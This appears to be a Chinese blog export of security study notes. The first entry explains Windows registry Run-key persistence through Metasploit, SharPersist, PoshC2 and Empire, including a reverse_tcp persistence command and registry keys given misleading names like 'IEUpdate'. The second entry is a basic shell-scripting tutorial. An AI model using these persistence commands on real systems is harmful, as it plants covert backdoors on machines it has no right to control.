</p><p>Meterpreter脚本将以VBS脚本的形式创建一个有效负载，该负载将被拖放到磁盘上，并将创建一个注 </p><p>册表项，该注册表项将在用户登录期间运行该有效负载。 </p><p>Metasploit – Meterpreter持久性脚本 </p><p>用户下次登录系统时，将打开一个新的Meterpreter会话。 </p><p>Metasploit – Meterpreter会话 </p><p>另外，还有一个后期开发模块，可用于持久性。该模块需要以下配置，并将可执行文件放置在受感染系 </p><p>统上的可写位置。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">run</span> persistence -U -P windows/x64/meterpreter/reverse_tcp -i <span class="hljs-number">5</span> -p <span class="hljs-number">443</span> -r<br><br><span class="hljs-attribute">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2</span>.<br><br><br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225145751907.png" alt="image-20211225145751907"></p><p>Metasploit – Meterpreter持久性脚本 </p><p>用户下次登录系统时，将打开一个新的Meterpreter会话。</p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225145808681.png" alt="image-20211225145808681"></p><p>Metasploit – Meterpreter会话 </p><p>另外，还有一个后期开发模块，可用于持久性。该模块需要以下配置，并将可执行文件放置在受感染系 </p><p>统上的可写位置</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gams">use post/windows/manage/persistence_exe<br><br><span class="hljs-keyword">set</span> REXEPATH /tmp/<span class="hljs-comment">pentestlab.exe</span><br><br><span class="hljs-keyword">set</span> <span class="hljs-comment">SESSION 2</span><br><br><span class="hljs-keyword">set</span> <span class="hljs-comment">STARTUP USER</span><br><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LOCALEXEPATH C:\\tmp</span><br><br>run<br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225145836598.png" alt="image-20211225145836598"></p><p>Metasploit –持久性利用后开发模块配置 </p><p>由于已选择<strong>USER</strong>作为选项，该模块将使用当前用户的注册表位置</p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225145851974.png" alt="image-20211225145851974"></p><p>Metasploit –持久性后期开发模块 </p><p>如果已获得系统级别的特权，则可以将该模块配置为在<strong>HKLM</strong>位置中创建注册表项。该<strong>STARTUP</strong>选项 </p><p>将需要改变系统。 </p><p>Metasploit –作为系统的持久性模块 </p><p>set STARTUP SYSTEM</p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225150021595.png" alt="image-20211225150021595"></p><p><strong>SharPersist</strong></p><p>SharPersist是Brett Hawkins在C＃中开发的工具，它结合了多种持久性技术，包括添加注册表运行 </p><p>键。该工具包可以加载到支持反射加载的各种命令和控制框架中，例如Cobalt Strike和PoshC2。以下 </p><p>命令将创建一个注册表项，该注册表项将从与Metasploit Framework模块相同的注册表位置执行任意 </p><p>有效负载。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">SharPersist -t <span class="hljs-keyword">reg</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe&quot;</span> -<span class="hljs-keyword">a</span> <span class="hljs-comment">&quot;/c</span><br><br>C:\tmp\pentestlab.<span class="hljs-keyword">exe</span><span class="hljs-string">&quot; -k &quot;</span>hkcurun<span class="hljs-string">&quot; -v &quot;</span>pentestlab<span class="hljs-comment">&quot; -m add</span><br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225150102381-164041566314418.png" alt="image-20211225150102381"></p><p>SharPersist –以用户身份注册 </p><p>如果已获得提升的访问权限，请修改命令以在本地计算机位置中安装注册表项，以实现所有用户的持久 </p><p>性。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">SharPersist -t <span class="hljs-keyword">reg</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe&quot;</span> -<span class="hljs-keyword">a</span> <span class="hljs-comment">&quot;/c</span><br><br>C:\tmp\pentestlab.<span class="hljs-keyword">exe</span><span class="hljs-string">&quot; -k &quot;</span>hklmrun<span class="hljs-string">&quot; -v &quot;</span>pentestlab<span class="hljs-comment">&quot; -m add -o env</span><br></code></pre></td></tr></table></figure><p>SharPersist –注册为SYSTEM </p><p>SharPersist还通过<strong>RunOnce</strong>和<strong>RunOnceEx</strong>注册表项包含持久性功能。以下命令将在这些位置创建注 </p><p>册表项，这些注册表项将执行任意有效负载。 </p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim">SharPersist -t <span class="hljs-keyword">reg</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe&quot;</span> -<span class="hljs-keyword">a</span> <span class="hljs-comment">&quot;/c </span><br><br>pentestlab.<span class="hljs-keyword">exe</span><span class="hljs-string">&quot; -k &quot;</span>hklmrunonce<span class="hljs-string">&quot; -v &quot;</span>Pentestlab<span class="hljs-comment">&quot; -m add </span><br><br>SharPersist -t <span class="hljs-keyword">reg</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe&quot;</span> -<span class="hljs-keyword">a</span> <span class="hljs-comment">&quot;/c </span><br><br>pentestlab.<span class="hljs-keyword">exe</span><span class="hljs-string">&quot; -k &quot;</span>hklmrunonceex<span class="hljs-string">&quot; -v &quot;</span>Pentestlab<span class="hljs-comment">&quot; -m add </span><br><br>SharPersist -t <span class="hljs-keyword">reg</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe&quot;</span> -<span class="hljs-keyword">a</span> <span class="hljs-comment">&quot;/c </span><br><br>pentestlab.<span class="hljs-keyword">exe</span><span class="hljs-string">&quot; -k &quot;</span>hkcurunonce<span class="hljs-string">&quot; -v &quot;</span>Pentestlab<span class="hljs-comment">&quot; -m add</span><br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225150141799.png" alt="image-20211225150141799"></p><p>SharPersist – RunOnce注册表项 </p><p>SharPersist还提供了使用另一个注册表位置进行持久化的选项（<strong>UserInitMprLogonScript</strong>）。 </p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">SharPersist -t <span class="hljs-keyword">reg</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe&quot;</span> -<span class="hljs-keyword">a</span> <span class="hljs-comment">&quot;/c </span><br><br>pentestlab.<span class="hljs-keyword">exe</span><span class="hljs-string">&quot; -k &quot;</span>logonscript<span class="hljs-comment">&quot; -m add</span><br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225150216295.png" alt="image-20211225150216295"></p><p><strong>PoshC2</strong> </p><p>PoshC2支持各种持久性功能，包括注册表运行键的方法。以下命令将在目标主机中创建两个注册表 </p><p>项。</p><p>install-persistence</p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225150239387.png" alt="image-20211225150239387"></p><p>PoshC2 –持久性 </p><p>注册表的“运行”项将具有IEUpdate的名称，以便看起来合法，第二个注册表项将作为墙纸隐藏在注册 </p><p>表中</p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225150253132.png" alt="image-20211225150253132"></p><p>PoshC2 –注册表运行键 </p><p><strong>Empire</strong> </p><p>如果将Empire用作命令和控件，Empire包含两个与通过注册表运行项与持久性技术对齐的模块。根据 </p><p>特权级别，这些模块将尝试在以下注册表位置中安装base64有效负载： </p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">HKCU</span>:SOFTWARE\Microsoft\Windows\CurrentVersion\Debug <br><br><span class="hljs-name">HKLM</span>:SOFTWARE\Microsoft\Windows\CurrentVersion\Debug<br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225150324745.png" alt="image-20211225150324745"></p><p>Empire – Debug 注册表项有效负载</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">usemodule persistence<span class="hljs-regexp">/userland/</span>registry <br><br>usemodule persistence<span class="hljs-regexp">/elevated/</span>registry* <br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225150348696.png" alt="image-20211225150348696"></p><p>Empire –Persistence Registry Module </p><p>将在名称<strong>Updater</strong>下创建另一个注册表项，该注册表项将包含要执行的命令。PowerShell将尝试在下 </p><p>次登录时运行<strong>Debug</strong>密钥中存储的有效负载，以实现持久性。</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">HKCU</span>:SOFTWARE\Microsoft\Windows\CurrentVersion\Run <br><br><span class="hljs-name">HKLM</span>:SOFTWARE\Microsoft\Windows\CurrentVersion\Run <br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225150413416.png" alt="image-20211225150413416"></p><p>Empire – Registry Run Key</p><p>参考链接：<a href="https://pentestlab.blog/">https://pentestlab.blog</a></p><h3 id="七、注册表指令函数功能介绍（c-函数）"><a href="#七、注册表指令函数功能介绍（c-函数）" class="headerlink" title="七、注册表指令函数功能介绍（c#函数）"></a>七、注册表指令函数功能介绍（c#函数）</h3><p>•<strong>REG_SZ</strong>：字符串数据的主要类型，用于存储固定长度的字符串或其他短文本 </p><p>值。我们在实际程序中通常只用这种数据类型，如果要保存布尔值时，将它表 </p><p>示成0或1。 </p><p>• <strong>REG_BINARY</strong>：用于存储二进制数据。 </p><p>• <strong>REG_EXPAND_SZ</strong>：可扩展的字符串值，可以保存在运行时才解析的系统变量。 </p><p>• <strong>REG_MULTI_SZ</strong>：以数组的格式保存多个文本字符串，每个字符串”元素”都以 </p><p>null字符结束</p><p><strong>(1) RegOpenKeyEx****函数</strong> </p><p>打开一个指定的注册表键。 </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk">LONG WINAPI RegOpenKeyEx( <br><br>HKEY hKey, <span class="hljs-regexp">//</span>需要打开的主键的名称 <br><br>LPCTSTR lpSubKey, <span class="hljs-regexp">//</span>需要打开的子键的名称 <br><br>DWORD ulOptions, <span class="hljs-regexp">//</span>保留,设为<span class="hljs-number">0</span> <br><br>REGSAM samDesired, <span class="hljs-regexp">//</span>安全访问标记,也就是权限 <br><br>PHKEY phkResult <span class="hljs-regexp">//</span>得到的将要打开键的句柄 <br><br>)<br><br><br></code></pre></td></tr></table></figure><p><strong>(2) RegSetValueEx****函数</strong> </p><p>在注册表项下设置指定值的数据和类型。返回零表示成功，返回其他任何值都代 </p><p>表一个错误代码。 </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk">LONG RegSetValueEx( <br><br>HKEY hKey, <span class="hljs-regexp">//</span>指定一个已打开句柄或标准项名 <br><br>LPCTSTR lpValueName, <span class="hljs-regexp">//</span>指向一个字符串的指针，该字符串包含设置值的名称 <br><br>DWORD Reserved, <span class="hljs-regexp">//</span>保留值,必须强制为<span class="hljs-number">0</span> <br><br>DWORD dwType, <span class="hljs-regexp">//</span>指定存储的数据类型,如REG_BINARY\REG_DWORD <br><br>CONST BYTE *lpData, <span class="hljs-regexp">//</span>指向一个缓冲区,包含指定名称存储的数据 <br><br>DWORD cbData <span class="hljs-regexp">//</span>指定由lpData参数指向的数据大小 <br><br>)<br></code></pre></td></tr></table></figure><p><strong>SHGetSpecialFolderPath****函数</strong> </p><p>获取指定的系统路径。 </p><p>BOOL SHGetSpecialFolderPath( </p><p>HWND hwndOwner, </p><p>LPTSTR lpszPath, </p><p>int nFolder, </p><p>BOOL fCreate </p><p>);</p><p><strong>参数</strong>： </p><p>hwndOwner：窗口所有者的句柄 </p><p>lpszPath：返回路径的缓冲区，该缓冲区大小至少为MAT_PATHA </p><p>nFolder：系统路径的CSIDL标识 </p><p>– CSIDL_BITBUCKET：桌面\回收站 </p><p>– CSIDL_CONTROLS：我的电脑\控制面板 </p><p>– CSIDL_DESKTOP：桌面 </p><p>– CSIDL_DRIVES：我的电脑 </p><p>– CSIDL_STARTUP：开始菜单\程序\启动 </p><p>– CSIDL_SYSTEM：System文件夹 </p><p>– CSIDL_WINDOWS：Windows目录 </p><p>• fCreate：指示文件夹不存在时是否要创建，FALSE不创建 </p><p><strong>返回值</strong>： </p><p>如果返回TRUE表示执行成功；否则执行失败。</p><p><strong>系统进程自启动是通过创建系统服务并设置服务启动类型为自动启动来实现的，接下来</strong> </p><p><strong>我们进行相关介绍。</strong> </p><p>**1.**<strong>函数介绍</strong> </p><p><strong>(1) OpenSCManager****函数</strong> </p><p>建立了一个到服务控制管理器的连接，并打开指定的数据库。如果函数成功，则返回一 </p><p>个服务控制管理器数据库的句柄；否则返回NULL。 </p><p>SC_HANDLE WINAPI OpenSCManager( </p><p>__in_opt LPCTSTR lpMachineName, &#x2F;&#x2F;指定计算机名称 </p><p>__in_opt LPCTSTR lpDatabaseName, &#x2F;&#x2F;指定要打开服务控制管理数据库的名称 </p><p>__in DWORD dwDesiredAccess &#x2F;&#x2F;指定服务访问控制管理器的权限 </p><p>);</p><p><strong>(2) CreateService****函数</strong> </p><p>建立一个服务对象，并将其添加到指定的服务控制管理器数据库中。如果函数成 </p><p>功，则返回该服务的句柄；否则返回NULL。 </p><p>SC_HANDLE CreateService( </p><p>SC_HANDLE hSCManager, &#x2F;&#x2F;服务控制管理器数据库的句柄 </p><p>LPCTSTR lpServiceName, &#x2F;&#x2F;要安装服务的名称 </p><p>LPCTSTR lpDisplayName, &#x2F;&#x2F;用户界面标识服务的显示名称 </p><p>DWORD dwDesiredAccess, &#x2F;&#x2F;对服务的访问 </p><p>DWORD dwServiceType, &#x2F;&#x2F;指定服务类型 </p><p>DWORD dwStartType, &#x2F;&#x2F;指定服务启动选项 </p><p>DWORD dwErrorControl, &#x2F;&#x2F;指定服务启动失败的严重程度 </p><p>LPCTSTR lpBinaryPathName, &#x2F;&#x2F;指定服务程序二进制文件的路径 </p><p>LPCTSTR lpLoadOrderGroup, &#x2F;&#x2F;指定顺序装入的服务组名 </p><p>LPDWORD lpdwTagId, &#x2F;&#x2F;标记变量 </p><p>LPCTSTR lpDependencies, &#x2F;&#x2F;指定启动该服务前必须先启动的服务或服务组 </p><p>LPCTSTR lpServiceStartName, &#x2F;&#x2F;该服务应运行的账户名称 </p><p>LPCTSTR lpPassword &#x2F;&#x2F;指定账户名的密码 </p><p>);</p><p>其中，dwStartType共有五种启动类型。 </p><p>前三种类型是 SERVICE_AUTO_START、SERVICE_DISABLED 和 </p><p>SERVICE_DEMAND_START。对应的标准启动类型自动、禁用和手动，通常 </p><p>使用“计算机管理”管理工具中的“服务”进行配置。 </p><p>后两种类型是 SERVICE_BOOT_START 和 SERVICE_SYSTEM_START， </p><p>通常用于配置加载设备驱动程序的方式。25 </p><p><strong>(3) OpenService****函数</strong> </p><p>打开一个已经存在的服务。如果函数成功，则返回该服务的句柄；否则返回NULL， </p><p>可以通过GetLastError获取错误码。 </p><p>SC_HANDLE WINAPI OpenService( </p><p>SC_HANDLE hSCManager, &#x2F;&#x2F;指向SCM数据库句柄 </p><p>LPCTSTR lpServiceName, &#x2F;&#x2F;要打开服务的名称 </p><p>DWORD dwDesiredAccess &#x2F;&#x2F;指定服务权限 </p><p>);</p><p><strong>(4) StartService****函数</strong> </p><p>启动服务。如果函数成功，则返回非零数值；否则返回0，可以通过GetLastError </p><p>获取错误码。 </p><p>SC_HANDLE WINAPI StartService( </p><p>SC_HANDLE hService, &#x2F;&#x2F;OpenService或CreateService函数返回服务句柄 </p><p>DWORD dwNumServiceArgs, &#x2F;&#x2F;下一个形参lpServiceArgVectors字符串个数 </p><p>LPCTSTR *lpServiceArgVectors &#x2F;&#x2F;传给服务ServiceMain的参数 </p><p>);</p><p><strong>(5) StartServiceCtrlDispatcher****函数</strong> </p><p>将服务进程的主线程连接到服务控制管理器，该线程将作为调用过程的服务控制 </p><p>分派器线程。如果函数成功，则返回非零数值；否则返回0，可以通过 </p><p>GetLastError获取错误码。 </p><p>BOOL WINAPI StartServiceCtrlDispatcher（ </p><p><em>In</em> const SERVICE_TABLE_ENTRY * lpServiceTable </p><p>)</p>]]></content>
    
    
    <categories>
      
      <category>免杀</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shell 编程开发</title>
    <link href="/shell%20%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91.html"/>
    <url>/shell%20%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91.html</url>
    
    <content type="html"><![CDATA[<p><font color='yellow'>熟练的 使用 shell 编程。</font></p><p><font color='red'>author: cdxiaodong </font></p><p><font color='red'>作者: cdxiaodong </font></p><p><font color='red'>请配合上面的scripts文件夹食用 如果需要shell脚本的可以联系我。 </font></p><p><font color='red'>无偿制作有趣的，关于网络安全的脚本</font></p><p>学习shell编程</p><p>参考：</p><p>《跟老男孩学Linux运维:Shell编程实战》</p><p>《Linux Shell核心编程实战》</p><p>目录:</p><p>[TOC]</p><h2 id="1开始起飞"><a href="#1开始起飞" class="headerlink" title="1开始起飞"></a>1开始起飞</h2><h3 id="1-1脚本执行方式"><a href="#1-1脚本执行方式" class="headerlink" title="1.1脚本执行方式"></a>1.1脚本执行方式</h3><p>1.sh文件权限  这个就不讲了</p><p>bash 和sh 可以直接执行   不行这样的话直接chmod 777</p><p>2.开启子进程执行的方式</p><p>关于是否开启子进程，我们首先要了解什么是子进程，一般可以通过pstree命令来查看进程树，了解进程之间的关系。</p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220313191613016.png" alt="image-20220313191613016"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313191704385.png" alt="image-20220313191704385"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313191749999.png" alt="image-20220313191749999"></p><p>通过以上输出，我们可以看到计算机启动的第一个进程是systemd，然后在这个进程下启动了N个子进程，如NetworkManager、atd、chronyd、sshd这些都是systemd的子进程。而在sshd进程下又有2个sshd的子进程，在2个sshd子进程下又开启了bash解释器子进程，而且在其中一个bash进程下面还执行了一条pstree命令。对于刚才我们说的不管是直接执行脚本，还是使用bash或sh这样的解释器执行脚本，都是会开启子进程的。</p><p>下面通过一个脚本文件演示效果</p><p>首先，打开一个命令终端，在该命令终端中编写脚本文件，并执行脚本文件。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313192751767.png" alt="image-20220313192751767"></p><p>然后，开启一个命令终端，在这个终端中通过pstree命令观察进程树。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313192819644.png" alt="image-20220313192819644"></p><p>通过输出可以看到，在bash终端下开启了一个子进程脚本文件，通过脚本文件执行了一条sleep命令。</p><p>回到第一个终端，使用Ctrl+C组合键终止前面执行的脚本文件，使用bash命令再次执行该脚本。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313192840244.png" alt="image-20220313192840244"></p><p>最后，在第二个终端上使用pstree命令观察实验结果。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313192857347.png" alt="image-20220313192857347"></p><p>结果类似，在bash进程下开启了一个bash子进程，在bash子进程下执行了一条sleep命令。</p><p>3.不开启子进程的执行方式</p><p>下面我们来看看不开启子进程的执行方式的案例，与之前的实验类似，我们需要开启两个命令终端。</p><p>首先，打开第一个终端，这次使用source或．（点）命令来执行脚本文件。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313192931952.png" alt="image-20220313192931952"></p><p>或者</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313193114008.png" alt="image-20220313193114008"></p><p>然后，我们再打开第二个终端，通过pstree命令观察结果。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313193135636.png" alt="image-20220313193135636"></p><p>通过实验结果可以看到，脚本文件中的sleep命令是直接在bash终端下执行的。最后，我们编写一个特殊的脚本文件，内容如下。</p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220313193157898.png" alt="image-20220313193157898"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313193341466.png" alt="image-20220313193341466"></p><p>你可能已经发现了，source命令不开启子进程执行脚本文件会导致整个终端被关闭</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313193422083.png" alt="image-20220313193422083"></p><p>这是因为 source exit.sh的话是不开启子进程来运行的，也就是在此命令窗里面运行，</p><p>所以直接执行的exit   导致命令窗口退出。</p><h3 id="1-2如何在脚本文件中实现输入于输出"><a href="#1-2如何在脚本文件中实现输入于输出" class="headerlink" title="1.2如何在脚本文件中实现输入于输出"></a>1.2如何在脚本文件中实现输入于输出</h3><p>1.使用echo命令创建一个脚本文件菜单</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313194617657.png" alt="image-20220313194617657"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313194607498.png" alt="image-20220313194607498"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313194719261.png" alt="image-20220313194719261"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313194839082.png" alt="image-20220313194839082"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313195349039.png" alt="image-20220313195349039"></p><p>输出hello，换行但光标仍旧停留在原来的位置，也就是字母o后面的这个位置，然后输出world。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313195454767.png" alt="image-20220313195454767"></p><p>\r会让光标返回行首</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313195748157.png" alt="image-20220313195748157"></p><p>加粗显示OK, \033或\e后面跟不同的代码可以设置不同的终端属性，1m是让终端粗体显示字符串，后面的OK就是需要显示的字符串内容，最后\033[0m是在加粗输出OK后，关闭终端的属性设置。如果最后没有使用0m关闭属性设置，则之后终端中所有的字符串都使用粗体显示。执行下面这条命令后，会发现除了OK加粗显示，后面在终端中输出的所有字符串都加粗显示。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313195850701.png" alt="image-20220313195850701"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313195928309.png" alt="image-20220313195928309"></p><p>除了可以定义终端的字体颜色、样式、背景，还可以使用H定义位置属性。例如，可以通过下面的命令在屏幕的第3行、第10列显示OK。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313200236757.png" alt="image-20220313200236757"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313200300321.png" alt="image-20220313200300321"></p><p>在看透第三行显示ok</p><p>最后，我们使用echo命令编写一个更有趣的脚本文件菜单！下面这个脚本文件，首先使用clear命令将整个屏幕清空，然后使用echo命令设置终端属性，打印了一个有颜色、有排版的个性化菜单。至于具体的颜色搭配，各位读者可以根据自己的需求进行个性化设计。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313200539215.png" alt="image-20220313200539215"></p><p>2.扩展知识，使用printf命令创建一个脚本菜单Linux系统中除了echo命令可以输出信息，还可以使用printf命令实现相同的效果。</p><p>功能描述：printf命令可以格式化输出数据。</p><p>printf命令的语法格式如下。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313200753058.png" alt="image-20220313200753058"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313200710349.png" alt="image-20220313200710349"></p><p>应用案例</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313200937613.png" alt="image-20220313200937613"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313201155666.png" alt="image-20220313201155666"></p><p>左对齐输出12，输出的内容占用10个字符宽度，12占用2个字符宽度，后面跟了8个空格位置。默认printf命令输出内容后不会换行，使用\n命令符可以在输出内容后换行。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313201300793.png" alt="image-20220313201300793"></p><p>类似于echo、</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313201826546.png" alt="image-20220313201826546"></p><p>只不过利用编程语言的特性 将45465用%secho进去</p><p>3.使用read命令读取用户的输入信息</p><p>前面我们学习了在Shell脚本中实现输出数据的方法，接下来探讨如何解决输入的问题，在Shell脚本中允许使用read命令实现数据的输入功能。</p><p>功能描述：read命令可以从标准输入读取一行数据。</p><p>read命令的语法格式如下。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313202025835.png" alt="image-20220313202025835"></p><p>如果未指定变量名，则默认变量名称为REPLY。read命令常用的选项如下所示。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313202055675.png" alt="image-20220313202055675"></p><p>从标准输入中读取数据，这里通过键盘输入了123, read命令则从标准输入读取这个123，并将该字符串赋值给变量key1，对于key1这个变量，我们可以使用echo$key1显示该变量的值。</p><p>应用案例：</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313202258447.png" alt="image-20220313202258447"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313202644939.png" alt="image-20220313202644939"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313202934814.png" alt="image-20220313202934814"></p><p>注意，这里提示输入密码后，当用户输入密码123时，计算机将密码的明文显示在屏幕上，这不是我们想看到的效果！怎么办？read命令支持-s选项，这个选项可以让用户输入的任何数据都不显示，但read命令依然可以读取用户输入的数据，只是数据不显示而已。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313203503201.png" alt="image-20220313203503201"></p><p>这个脚本通过read命令读取用户输入的用户名和密码，并且在读取用户输入的密码时，不直接在屏幕上显示密码的内容，这样更安全。用户输入的用户名和密码分别保存在user和pass这两个变量中，下面就通过$调用变量中的值，使用useradd命令创建一个系统账户，使用passwd命令给用户配置密码。直接使用passwd修改密码默认采用人机交互的方式配置密码，需要人为手动输入密码，并且要重复输入两次。这里我们使用了一个|符号，这个符号就像管道，它的作用是将前一个命令的输出结果，通过管道传给后一个命令，作为后一个命令的输入。</p><p>有时候，在Linux系统中我们需要完成一个复杂的任务，但是某一个命令可能无法完成这个任务，此时，我们就需要使用管道把两个或多个命令组合在一起来完成这样的任务。</p><p>如图下所示，类似于传输水的管道，Linux系统的管道，可以将命令1的输出结果（数据），存储到管道中，然后让命令2从管道中读取数据，并对数据做进一步的处理。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313203904564.png" alt="image-20220313203904564"></p><p>下面我们看几个管道的案例。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313204046088.png" 